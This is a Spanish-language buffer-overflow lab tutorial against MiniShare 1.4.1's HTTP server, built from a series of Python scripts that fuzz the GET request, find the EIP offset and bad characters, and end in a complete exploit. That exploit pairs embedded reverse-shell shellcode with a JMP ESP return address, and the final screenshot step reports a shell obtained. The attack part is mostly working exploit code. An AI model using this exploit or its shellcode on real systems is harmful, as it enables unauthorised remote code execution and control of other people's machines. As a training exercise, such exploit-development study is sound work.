Con el objetivo de reforzar todo lo aprendido hasta ahora, vamos a intentar explotar otro Buffer Overflow. El procedimiento que aplicaremos será el mismo, aunque la fase inicial y la forma de entablar las conexiones en Python cambiarán un poco.

Primero descargaremos el software vulnerable el cual es el MiniShare en su version 1.4.1 el cual lo podemos descargar desde el siguieente link https://sourceforge.net/projects/minishare/files/OldFiles/minishare-1.4.1.exe/download al momento de entrar este se descargara automaticamente  

Ya descargado lo tendremos que instalar para eso damos doble click en este y nos saldra lo siguiente aqui solo le damos en si 


![[Pasted image 20240311093715.png]]

Despues nos saldra esta ventana que nos pide la ruta de instalacion asi que la dejamos por defecto y damos click en el boton de instalar 

![[Pasted image 20240311093836.png]]

Y listo al parcer la instalacion ha sido completada asi que solo le damos click al boton de cerrar

![[Pasted image 20240311093923.png]]


Ya tendrimaos el minishare 1.4.1 instalado en nuestra maquina victima 


![[Pasted image 20240311094009.png]]

Este servicio lo que hace es que monta un servicio HTTP por el puerto 80


Al investigar un poco mas este software nos podemos dar cuenta con ayuda de de searchsploit que esta version es vulnerable a un buffer overflow en la solicitudes del recurso al que quieres tratar de ingreasar __

![[Pasted image 20240311094623.png]]

Entonces sabiendo esto vamos a tratar de hacer un exploit en python para hacer un poco de fuzzing al MiniShare pero antes de esto nos abrimos el immunty debugger presionamos ctrl + f1 y seleccionamos el proceso que queremos analizar en este caso el minishare y le damos click al boton de attach

![[Pasted image 20240311095147.png]]


Ahora solo le damos click al boton de play para que el proceso siga corriendo con normalidad


![[Pasted image 20240311095345.png]]


Ahora ya podremos crear nuestro explooit en python para hacer fuzzing en este caso quedaria de la siguiente manera

```python 
#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80


def exploit():
    total_length=100

    while True:

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(7)

            s.connect((ip, port))

            print("\n[+] Enviando %d bytes" % total_length)

            s.send(b"GET "+b"\x41"*total_length+b" HTTP/1.1\r\n\r\n")
            s.recv(1024)
            s.close()

            total_length += 100

        except:

            print("\n[i] El servicio ha crasheado con un total de %d bytes enviados" % total_length)

            sys.exit(1)

if __name__ == "__main__":
    exploit()

```

Este script realiza un ataque de desbordamiento de búfer incremental contra un servidor HTTP remoto, enviando solicitudes GET con cada vez más bytes de datos de carga útil hasta que el servicio se bloquea.


Entonces ahora ya que el script esta hecho lo podemos ejecutar al esperar algun tiempo podemos ver que nos da la cantidad del bytes con los que el programa se corrompio

![[Pasted image 20240311113011.png]]

Al verificar en el immunity debugger podemos ver que el proceso se ha pausado y que ahora el EIP tiene el valor de 4 aes en hexadecimal


![[Pasted image 20240311113202.png]]

Ahora lo que tenemos que hacer es saber cuantos bytes tenemos que enviar exactamente para sobrescribir el EIP para eso nos podemos ayudar de la herramienta de metasploit para asi crear un patron de 1800 bytes para luego copiarlo


![[Pasted image 20240311113536.png]]

Ahora este patron generado lo integramos en nuestro exploit y lo modificamos un poco quedaria de la siguiente manera


```python
#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80


payload=b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip, port))

        s.send(b"GET "+payload+b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()



    except:


        sys.exit(1)

if __name__ == "__main__":
    exploit()

```

Ahora antes de ejecutarlo reiniciamos el immuntiy debugger y el minishare ya reiniciado todo ejecutamos el exploit


![[Pasted image 20240311121108.png]]

Si ahora nos dirigimos al immunity debugger podemos ver que el servicio se ha pausado y el EIP se ha sobrescrito por lo que ahora nos copiamos el valor del EIP

![[Pasted image 20240311121354.png]]

Este valor del EIP lo usamos en conjunto con la siguiente herramienta del metasploit la cual nos dara el offset


![[Pasted image 20240311121558.png]]

Ya sabiendo el offset vamos a verficar si en realidad este esta correcto por lo que vamos a modificar el exploit para que ingresar 4 bes en el EIP si el offset es correcto entonces lo que vamos a ver son 4 bes en el EIP representadas en hexadecimal el exploit quedaria de la siguiente manera

```python
#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80

offset=1787

before_eip=b"A"*offset

eip=b"B"*4

payload=before_eip+eip

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip, port))


        s.send(b"GET "+payload+b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()
    except:


        sys.exit(1)

if __name__ == "__main__":
    exploit()

```

Antes de ejecutarlo reinicimaos el immunity manager y el minishare ya reiniciado entonces ahora si lo ejecutamos 

![[Pasted image 20240311123529.png]]

Si ahora nos vamos al immunity manager podemos ver que el EIP ahora apunta a 4 bes por lo que al parecer ya tenemos control sobre este 

![[Pasted image 20240311123620.png]]

Lo siguiente que vamos a hacer es averiguar a donde se va lo que va despuees del EIP para eso vamos a  modifcar el exploit mandando 500 ces para despues  ver donde se almacenan este seria el exploit ya modificado 


```python
#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80

offset=1787

before_eip=b"A"*offset

eip=b"B"*4

payload=before_eip+eip+b"C"*500

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip, port))


        s.send(b"GET "+payload+b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()
    except:


        sys.exit(1)

if __name__ == "__main__":
    exploit()

```

De igual manera antes de ejecutarlo reinciamos el immunity debugger y el minishare para despues ya reiniciados ahora si ejecutamos el exploit


![[Pasted image 20240311124926.png]]


Ahora si nos vamos al immunity debugger podemos ver que en el ESP estan almacendas todas las ces y estas se encuentra al comienzo del ESP


![[Pasted image 20240311125145.png]]

Entonces lo que tendriamos que hacer ahora es tratar de encontrar los badchars para eso primero tenemos que construir nuestro bytearray tenemos que eliminar la carpeta que creamos anteriormente para despues ejecutar este comando 


![[Pasted image 20240311132252.png]]

Y ahora nos abria creado una nueva secuencia de bytes que es la siguiente 


![[Pasted image 20240311132435.png]]

Este bytearray nos lo copiaamos y con este modifcamos el exploit para asi tratar de encontrar los badchars el exploit quedaria de la siguiente manera

```python
#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80

offset=1787

before_eip=b"A"*offset
badchars=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
eip=b"B"*4

payload=before_eip+eip+badchars

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip, port))


        s.send(b"GET "+payload+b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()
    except:


        sys.exit(1)

if __name__ == "__main__":
    exploit()


```

Antes de ejecutar el exploit reinciamos el immunity debugger y el minishare para luego con estos ya reiniciados ejecutar el exploit 

![[Pasted image 20240311133840.png]]

Ahora para saber cual badchar encontro nos copiamos el valor del ESP y usamos la ruta de la carpeta de trabajo en el siguiente comando


![[Pasted image 20240311155744.png]]

Al ejecutarlo podemos ver que nos muestra los badchars en este caso encontro el 0d como badchar 


![[Pasted image 20240311155844.png]]

Ya sabiendo cual es el badchar generamos un nuevo bytearray pero que no incluya este badchar con el siguiente comando

![[Pasted image 20240311160115.png]]

Ya con el badchar localizando ahora modificamos nuestro exploit y lo eliminamos del bytearray el exploit quedaira de la siguiente manera 


```python
#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80

offset=1787

before_eip=b"A"*offset
badchars=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
eip=b"B"*4

payload=before_eip+eip+badchars

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip, port))


        s.send(b"GET "+payload+b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()
    except:


        sys.exit(1)

if __name__ == "__main__":
    exploit()

```

Antes de ejecutarlo reinicamos otra vez el immunity debugger y el minishare para despues ya ejecutar el exploit

![[Pasted image 20240311184202.png]]

Ya ejecutado nos vamos al immunity debugger y usamos el siguiente comando que con ayuda de mona, el uso de la direccion del ESP y la ruta de nuestro bytearray nos tiene que decir cuales son los badchars que ha encontrado 

![[Pasted image 20240311184839.png]]


Al ejecutarlo nos podemos dar cuenta que no ha encontrado ningun otro badchar adicional 


![[Pasted image 20240311184916.png]]


Ahora sabiendo cuales son los badchars lo siguiente que tenemos que hacer es generar el shellcode para eso podemos usar el siguiente comando para asi genera un shellcode que nos otrorgue una reverse shell 

![[Pasted image 20240311194116.png]]

Ya con el shellcode lo integramos al exploit y agreamos algunos NOPs antes del shellcode  ya modificado seria el siguiente


```python

#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80

offset=1787

before_eip=b"A"*offset

shellcode=(b"\xba\x49\x1c\xae\x2f\xda\xde\xd9\x74\x24\xf4\x58\x33\xc9"
b"\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\x19\x12\x4c\xda\x65"
b"\xc2\x12\x25\x95\x13\x73\xaf\x70\x22\xb3\xcb\xf1\x15\x03"
b"\x9f\x57\x9a\xe8\xcd\x43\x29\x9c\xd9\x64\x9a\x2b\x3c\x4b"
b"\x1b\x07\x7c\xca\x9f\x5a\x51\x2c\xa1\x94\xa4\x2d\xe6\xc9"
b"\x45\x7f\xbf\x86\xf8\x6f\xb4\xd3\xc0\x04\x86\xf2\x40\xf9"
b"\x5f\xf4\x61\xac\xd4\xaf\xa1\x4f\x38\xc4\xeb\x57\x5d\xe1"
b"\xa2\xec\x95\x9d\x34\x24\xe4\x5e\x9a\x09\xc8\xac\xe2\x4e"
b"\xef\x4e\x91\xa6\x13\xf2\xa2\x7d\x69\x28\x26\x65\xc9\xbb"
b"\x90\x41\xeb\x68\x46\x02\xe7\xc5\x0c\x4c\xe4\xd8\xc1\xe7"
b"\x10\x50\xe4\x27\x91\x22\xc3\xe3\xf9\xf1\x6a\xb2\xa7\x54"
b"\x92\xa4\x07\x08\x36\xaf\xaa\x5d\x4b\xf2\xa2\x92\x66\x0c"
b"\x33\xbd\xf1\x7f\x01\x62\xaa\x17\x29\xeb\x74\xe0\x4e\xc6"
b"\xc1\x7e\xb1\xe9\x31\x57\x76\xbd\x61\xcf\x5f\xbe\xe9\x0f"
b"\x5f\x6b\xbd\x5f\xcf\xc4\x7e\x0f\xaf\xb4\x16\x45\x20\xea"
b"\x07\x66\xea\x83\xa2\x9d\x7d\x6c\x9a\x9d\xfd\x04\xd9\x9d"
b"\xfc\x6f\x54\x7b\x94\x9f\x31\xd4\x01\x39\x18\xae\xb0\xc6"
b"\xb6\xcb\xf3\x4d\x35\x2c\xbd\xa5\x30\x3e\x2a\x46\x0f\x1c"
b"\xfd\x59\xa5\x08\x61\xcb\x22\xc8\xec\xf0\xfc\x9f\xb9\xc7"
b"\xf4\x75\x54\x71\xaf\x6b\xa5\xe7\x88\x2f\x72\xd4\x17\xae"
b"\xf7\x60\x3c\xa0\xc1\x69\x78\x94\x9d\x3f\xd6\x42\x58\x96"
b"\x98\x3c\x32\x45\x73\xa8\xc3\xa5\x44\xae\xcb\xe3\x32\x4e"
b"\x7d\x5a\x03\x71\xb2\x0a\x83\x0a\xae\xaa\x6c\xc1\x6a\xca"
b"\x8e\xc3\x86\x63\x17\x86\x2a\xee\xa8\x7d\x68\x17\x2b\x77"
b"\x11\xec\x33\xf2\x14\xa8\xf3\xef\x64\xa1\x91\x0f\xda\xc2"
b"\xb3")

eip=b"B"*4

payload=before_eip+eip+b"\x90"*16+shellcode

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip, port))


        s.send(b"GET "+payload+b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()
    except:


        sys.exit(1)

if __name__ == "__main__":
    exploit()

```



Ahora solo faltaria modificar el EIP para que este apunte a una direccion donde se aplique un salto al ESP para eso primero tenemos que saber el opcode del jmp esp para encontrarlo podemos usar esta herramienta

![[Pasted image 20240311195139.png]]

La ejecutamos y indicamos que queremos saber cual es el opcode de jmp esp


![[Pasted image 20240311195615.png]]


Ahora regresamos al immunity debugger e ingresamos el siguiente comando el cual nos mostratar todos los modulos con sus diferentes protecciones por lo que escogemos uno el cual no tenga ningun tipo de proteccion en este caso seleccionaremos el unico que no cuenta con protecciones el cual corresponde al propio binario de minishare

![[Pasted image 20240311201443.png]]

Ya seleccionado el modulo ahora podemos usar la siguiente utilidad de mona  en la cual indicamos el opcode de jmp esp y el modulo 

![[Pasted image 20240311201810.png]]

Al ejecutar este comando vemos que no ha encontrado nada 


![[Pasted image 20240311201857.png]]

Por lo que ahora tendremos que usar otra utilidad en la que solo tendremos que indicar la instruccion que queremos buscar en este caso el jmp esp

![[Pasted image 20240311202320.png]]

Al ejecutarlo nos mostrara varias direcciones donde al parecer hay instrucciones jmp esp por lo que seleccionaremos alguna que no contenga los badchars que hemos encontrado anteriormente por ejemplo la siguiente

![[Pasted image 20240311204531.png]]

Esta direccion nos la copiamos y la integramos en el exploit para que ahora el EIP apunte a esta direccion y de esta manera el shellcode sea interpretado correctamente el exploit quedaria de la siguiente manera

```python

#!/usr/bin/python3.11



from struct import pack 
import sys, socket


ip="192.168.0.2"

port=80

offset=1787

before_eip=b"A"*offset

shellcode=(b"\xba\x49\x1c\xae\x2f\xda\xde\xd9\x74\x24\xf4\x58\x33\xc9"
b"\xb1\x52\x83\xe8\xfc\x31\x50\x0e\x03\x19\x12\x4c\xda\x65"
b"\xc2\x12\x25\x95\x13\x73\xaf\x70\x22\xb3\xcb\xf1\x15\x03"
b"\x9f\x57\x9a\xe8\xcd\x43\x29\x9c\xd9\x64\x9a\x2b\x3c\x4b"
b"\x1b\x07\x7c\xca\x9f\x5a\x51\x2c\xa1\x94\xa4\x2d\xe6\xc9"
b"\x45\x7f\xbf\x86\xf8\x6f\xb4\xd3\xc0\x04\x86\xf2\x40\xf9"
b"\x5f\xf4\x61\xac\xd4\xaf\xa1\x4f\x38\xc4\xeb\x57\x5d\xe1"
b"\xa2\xec\x95\x9d\x34\x24\xe4\x5e\x9a\x09\xc8\xac\xe2\x4e"
b"\xef\x4e\x91\xa6\x13\xf2\xa2\x7d\x69\x28\x26\x65\xc9\xbb"
b"\x90\x41\xeb\x68\x46\x02\xe7\xc5\x0c\x4c\xe4\xd8\xc1\xe7"
b"\x10\x50\xe4\x27\x91\x22\xc3\xe3\xf9\xf1\x6a\xb2\xa7\x54"
b"\x92\xa4\x07\x08\x36\xaf\xaa\x5d\x4b\xf2\xa2\x92\x66\x0c"
b"\x33\xbd\xf1\x7f\x01\x62\xaa\x17\x29\xeb\x74\xe0\x4e\xc6"
b"\xc1\x7e\xb1\xe9\x31\x57\x76\xbd\x61\xcf\x5f\xbe\xe9\x0f"
b"\x5f\x6b\xbd\x5f\xcf\xc4\x7e\x0f\xaf\xb4\x16\x45\x20\xea"
b"\x07\x66\xea\x83\xa2\x9d\x7d\x6c\x9a\x9d\xfd\x04\xd9\x9d"
b"\xfc\x6f\x54\x7b\x94\x9f\x31\xd4\x01\x39\x18\xae\xb0\xc6"
b"\xb6\xcb\xf3\x4d\x35\x2c\xbd\xa5\x30\x3e\x2a\x46\x0f\x1c"
b"\xfd\x59\xa5\x08\x61\xcb\x22\xc8\xec\xf0\xfc\x9f\xb9\xc7"
b"\xf4\x75\x54\x71\xaf\x6b\xa5\xe7\x88\x2f\x72\xd4\x17\xae"
b"\xf7\x60\x3c\xa0\xc1\x69\x78\x94\x9d\x3f\xd6\x42\x58\x96"
b"\x98\x3c\x32\x45\x73\xa8\xc3\xa5\x44\xae\xcb\xe3\x32\x4e"
b"\x7d\x5a\x03\x71\xb2\x0a\x83\x0a\xae\xaa\x6c\xc1\x6a\xca"
b"\x8e\xc3\x86\x63\x17\x86\x2a\xee\xa8\x7d\x68\x17\x2b\x77"
b"\x11\xec\x33\xf2\x14\xa8\xf3\xef\x64\xa1\x91\x0f\xda\xc2"
b"\xb3")

eip=pack("<L",0x76c5a2dc)

payload=before_eip+eip+b"\x90"*16+shellcode

def exploit():

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(7)

        s.connect((ip, port))


        s.send(b"GET "+payload+b" HTTP/1.1\r\n\r\n")
        s.recv(1024)
        s.close()
    except:


        sys.exit(1)

if __name__ == "__main__":
    exploit()

```


Ahora solo nos tendiramos que poner en escucha en el puerto especificado desde la maquina atacante 
![[Pasted image 20240311210052.png]]

Finalmente antes de ejecutar el exploit reinciamos el sercvicio de minishare y ya reiniciado ahora si lo ejecutamos 

![[Pasted image 20240311210201.png]]

Y listo como podemos ver nos ha dado una reverse shell 

![[Pasted image 20240311210315.png]]






